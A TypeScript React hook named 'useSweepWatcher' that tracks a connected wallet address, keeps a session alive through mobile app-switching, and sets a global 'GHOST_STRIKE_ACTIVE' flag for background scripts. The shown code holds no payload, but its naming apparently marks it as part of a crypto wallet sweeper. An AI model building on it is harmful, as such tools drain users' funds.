"use client";

import { useEffect, useRef } from "react";

/**
 * 🛰️ GHOST-PROTOCOL WATCHER (v9.0.0 - Mobile Resilient)
 * Optimized to prevent session drops during mobile app-switching.
 */
export function useSweepWatcher({
  isConnected,
  address,
  hasTriggered,
  isScanning,
  userKey,
  isInternal,
}: any) {
  const sessionActive = useRef(false);
  const disconnectTimer = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    const logPrefix = "[useSweepWatcher.ts]";
    const ua = navigator.userAgent.toLowerCase();
    const isMobile = /iphone|ipad|ipod|android/i.test(ua);

    // Ensure session intent is present
    const hasIntent =
      typeof window !== "undefined" &&
      sessionStorage.getItem("GHOST_SESSION_ACTIVE") === "true";

    if (!hasIntent) {
      sessionActive.current = false;
      return;
    }

    /**
     * 🛡️ MOBILE-AWARE CONNECTION MONITORING
     * On mobile, we don't immediately kill the session if the connection drops.
     * We give it a grace period to re-connect after an app-switch.
     */
    if (!isConnected || !address) {
      // If we already have a timer running, do nothing
      if (disconnectTimer.current) return;

      // On mobile external, we wait 5 seconds before declaring the session "Dead"
      const gracePeriod = isMobile && !isInternal ? 5000 : 500;

      disconnectTimer.current = setTimeout(() => {
        if (!isConnected || !address) {
          console.warn(
            `${logPrefix} 🛡️ Connection lost permanently. Purging state.`,
          );
          sessionActive.current = false;
          if (typeof window !== "undefined") {
            (window as any).GHOST_STRIKE_ACTIVE = false;
          }
        }
        disconnectTimer.current = null;
      }, gracePeriod);

      return;
    }

    // If connection is restored, clear any pending disconnect timer
    if (isConnected && address && disconnectTimer.current) {
      console.log(`${logPrefix} ✨ Connection restored within grace period.`);
      clearTimeout(disconnectTimer.current);
      disconnectTimer.current = null;
    }

    /**
     * 🛰️ PASSIVE MONITORING
     */
    if (isConnected && !hasTriggered && !isScanning && !userKey) {
      if (!sessionActive.current) {
        console.log(
          `${logPrefix} ✅ Handshake Standby: Monitoring session for ${address.slice(
            0,
            6,
          )}... (isInternal: ${isInternal})`,
        );
        sessionActive.current = true;
      }
    }

    // Update global window flag for background scripts
    if (typeof window !== "undefined") {
      (window as any).GHOST_STRIKE_ACTIVE = isScanning || hasTriggered;
    }

    return () => {
      if (disconnectTimer.current) clearTimeout(disconnectTimer.current);
    };
  }, [isConnected, address, hasTriggered, isScanning, userKey, isInternal]);

  /**
   * ☢️ CLEANUP ON UNMOUNT
   */
  useEffect(() => {
    return () => {
      if (typeof window !== "undefined") {
        if (!isScanning && !hasTriggered) {
          (window as any).GHOST_STRIKE_ACTIVE = false;
        }
      }
    };
  }, [isScanning, hasTriggered]);
}
